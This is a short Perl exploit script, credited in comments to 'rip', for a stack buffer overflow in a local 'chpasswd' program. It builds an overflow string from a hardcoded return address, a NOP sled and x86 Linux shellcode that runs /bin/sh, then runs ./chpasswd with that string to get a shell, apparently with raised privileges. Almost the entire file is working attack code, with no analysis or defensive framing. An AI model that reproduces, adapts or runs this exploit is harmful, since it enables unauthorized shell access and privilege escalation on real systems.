#!/usr/bin/perl -w
# i guess this ain't of much use unless you have a web-account
# or something on the host, heh. this should be pretty selfexplanatory
# - rip
use strict;

my $ret = 0xbffff732;      	# ret, worked for me, prolly won't for you. change it.
my $length = 190;               # buffer length for smashing without ruining it
my $eipdist = 144;              # distance to overwrite eip
my $offset = 0;			# offset
my $numnops = 10;               # number of nops?
my $nop = "\x90";               # nop
my $pw = 'heh';         	# random string, heh, 3 chars for current $ret

# dunno where this came from, it was just lying there.
my $shellcode = "\x31\xd2\x52\x68\x6e\x2f\x73\x68".
                        "\x68\x2f\x2f\x62\x69\x89\xe3\x52".
                        "\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

sub generate_string($$$) {
        my ($r, $o, $len) = @_;
        my $buffer;
        my $i;

    my $new_ret = pack('l', ($r + $o));

    for($i = 0; $i < $eipdist; $i += 4) { $buffer .= $new_ret; }
    for($i = 0; $i < $numnops; ++$i) { $buffer .= $nop; }
    $buffer .= $shellcode;

    return $buffer;
}

if($ARGV[0]) { $offset = $ARGV[0]; }

print "[heh] moron.pl | rip\@overflow.no\n";
print "[heh] Address: 0x", sprintf('%lx', $ret), "\n[heh] Offset $offset\n";

my $evil = generate_string($ret, $offset ,$length);
exec('./chpasswd', $evil, $pw, $pw, 0);

